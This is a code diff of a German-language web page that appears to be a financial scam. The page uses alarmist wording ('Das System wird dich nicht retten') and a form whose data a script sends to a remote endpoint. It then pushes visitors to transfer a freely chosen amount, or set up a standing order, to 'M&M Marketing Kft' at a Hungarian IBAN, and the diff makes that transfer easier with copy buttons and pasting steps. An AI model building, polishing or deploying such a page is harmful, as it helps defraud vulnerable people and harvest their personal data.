@@ -17,6 +17,16 @@ body {
   margin: auto;
   background: white;
   padding: 20px;
+  box-sizing: border-box;
+  text-align: center;
+}
+
+h2 {
+  font-size: 22px;
+}
+
+p {
+  font-size: 15px;
 }
 
 input {
@@ -24,25 +34,25 @@ input {
   padding: 12px;
   margin: 6px 0;
   font-size: 16px;
+  box-sizing: border-box;
 }
 
 button {
-  width: 100%;
   padding: 14px;
-  margin-top: 10px;
+  width: 100%;
+  font-size: 16px;
   background: black;
   color: white;
   border: none;
-  font-size: 16px;
+  margin-top: 8px;
 }
 
 .copyBtn {
-  background: #444;
+  background: #222;
 }
 
 #loader {
-  display: none;
-  text-align: center;
+  display:none;
 }
 
 .spinner {
@@ -65,7 +75,7 @@ button {
 
 <div class="container">
 
-<h2>Schütze dein Vermögen bevor es zu spät ist</h2>
+<h2>Schütze dein Vermögen, bevor es zu spät ist</h2>
 <p><strong>Das System wird dich nicht retten.</strong><br>
 Sichere dich jetzt selbst ab – in unter 60 Sekunden.</p>
 
@@ -97,12 +107,10 @@ Ich bestätige die Richtigkeit meiner Angaben
 <p id="kundenId"></p>
 <button class="copyBtn" onclick="copyID()">ID kopieren</button>
 
-<h3>Überweisung starten</h3>
-<button onclick="openBanking()">Jetzt in Banking App öffnen</button>
-
 <h3>Überweisungsdaten</h3>
-<p>M&M Marketing Kft</p>
-<p>RAIFFEISEN Ungarn</p>
+
+<p id="empfaenger">M&M Marketing Kft</p>
+<button class="copyBtn" onclick="copyEmpfaenger()">Empfänger kopieren</button>
 
 <p id="iban">HU94120111480189343900200001</p>
 <button class="copyBtn" onclick="copyIBAN()">IBAN kopieren</button>
@@ -112,11 +120,12 @@ Ich bestätige die Richtigkeit meiner Angaben
 <p>Betrag frei wählbar</p>
 
 <h3>So geht's</h3>
-<p>
-1. Button klicken<br>
-2. Banking App öffnet sich<br>
-3. Zahlung bestätigen<br>
-4. Dauerauftrag einrichten
+<p style="text-align:left;">
+1. Banking-App öffnen<br>
+2. Dauerauftrag oder Überweisung auswählen<br>
+3. IBAN kopieren und in die Banking-App einfügen<br>
+4. Zahlungsempfänger kopieren und einfügen<br>
+5. ID kopieren und als Verwendungszweck setzen
 </p>
 
 </div>
@@ -159,9 +168,9 @@ const data = {
   id: id
 };
 
-fetch(scriptURL, {
-  method: "POST",
-  mode: "no-cors",
+fetch(scriptURL,{
+  method:"POST",
+  mode:"no-cors",
   body: JSON.stringify(data)
 });
 
@@ -181,19 +190,12 @@ function copyIBAN(){
 navigator.clipboard.writeText("HU94120111480189343900200001");
 }
 
-function copyID(){
-navigator.clipboard.writeText(document.getElementById("kundenId").innerText);
+function copyEmpfaenger(){
+navigator.clipboard.writeText("M&M Marketing Kft");
 }
 
-function openBanking() {
-  const iban = "HU94120111480189343900200001";
-  const name = "M&M Marketing Kft";
-  const reference = document.getElementById("kundenId").innerText;
-
-  // universeller Versuch (funktioniert je nach Banking App)
-  const url = `intent://transfer?iban=${iban}&name=${encodeURIComponent(name)}&reason=${reference}#Intent;scheme=bank;end`;
-
-  window.location.href = url;
+function copyID(){
+navigator.clipboard.writeText(document.getElementById("kundenId").innerText);
 }
 
 </script>
